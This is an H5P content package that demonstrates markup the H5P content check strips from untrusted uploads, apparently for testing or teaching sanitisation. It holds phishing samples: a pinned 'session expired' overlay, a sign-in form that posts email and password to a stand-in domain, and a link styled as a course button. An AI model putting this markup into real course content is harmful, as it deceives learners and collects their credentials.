{
  "content": [
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<h2>Markup the content check removes</h2><p>This package holds markup an H5P site would never let an author save. Each part below says what to look for. Switch between <strong>Trusted</strong> and <strong>Untrusted</strong> above the player to compare: untrusted, the content check removes what a field does not allow before the content starts, as the H5P plugins for Moodle, WordPress and Drupal do with an upload.</p><p>It is harmless here. Nothing in it runs a script in either mode, and the form and the link point at a domain that does not exist.</p>"
        },
        "subContentId": "8f3c2a61-4b7e-4d2a-9c11-5e6f7a8b9c01",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "What this package is"
        }
      },
      "useSeparator": "auto"
    },
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<h3>1. A notice over the page</h3><p><strong>Trusted:</strong> a red notice pinned to the corner of the player, over the content. <strong>Untrusted:</strong> the pinning is removed, and the notice stays here in the colours a text may have.</p><div style=\"position:fixed;right:16px;bottom:16px;z-index:2147483647;max-width:300px;padding:12px 16px;border-radius:8px;box-shadow:0 6px 24px rgba(0,0,0,0.25);background-color:#b4232a;color:#ffffff;font-weight:bold\">Your session has expired. Sign in below to keep your progress.</div>"
        },
        "subContentId": "3d9b7e42-1c5a-4f8e-8a3b-6c2d1e0f9a02",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "A notice over the page"
        }
      },
      "useSeparator": "auto"
    },
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<h3>2. A sign-in form</h3><p><strong>Trusted:</strong> fields asking for an email and a password. <strong>Untrusted:</strong> the form and its fields are removed, and only their words stay.</p><form action=\"https://sign-in.example/collect\" method=\"post\" style=\"max-width:320px;padding:16px;border:1px solid #d0d7de;border-radius:8px\"><p><label>Email<br><input type=\"email\" name=\"email\" autocomplete=\"off\" style=\"width:100%;box-sizing:border-box;margin-top:4px;padding:8px 10px;border:1px solid #c9d0d9;border-radius:6px;font:inherit\"></label></p><p><label>Password<br><input type=\"password\" name=\"password\" autocomplete=\"off\" style=\"width:100%;box-sizing:border-box;margin-top:4px;padding:8px 10px;border:1px solid #c9d0d9;border-radius:6px;font:inherit\"></label></p><p><button type=\"submit\" style=\"padding:8px 18px;border:0;border-radius:6px;background-color:#1d7a42;color:#ffffff;font:inherit\">Sign in</button></p></form>"
        },
        "subContentId": "c7e1f093-5a2b-4c6d-9e8f-0a1b2c3d4e03",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "A sign-in form"
        }
      },
      "useSeparator": "auto"
    },
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<h3>3. A link dressed as a button</h3><p><strong>Trusted:</strong> a button. <strong>Untrusted:</strong> a plain link, since a link may not carry a style.</p><p><a href=\"https://sign-in.example/\" style=\"display:inline-block;padding:10px 18px;border-radius:6px;background-color:#2f6df6;color:#ffffff;text-decoration:none\">Continue to your course</a></p>"
        },
        "subContentId": "5b2e8d14-9f6a-4a3c-b7d1-2e4f6a8c0b04",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "A link dressed as a button"
        }
      },
      "useSeparator": "auto"
    }
  ]
}
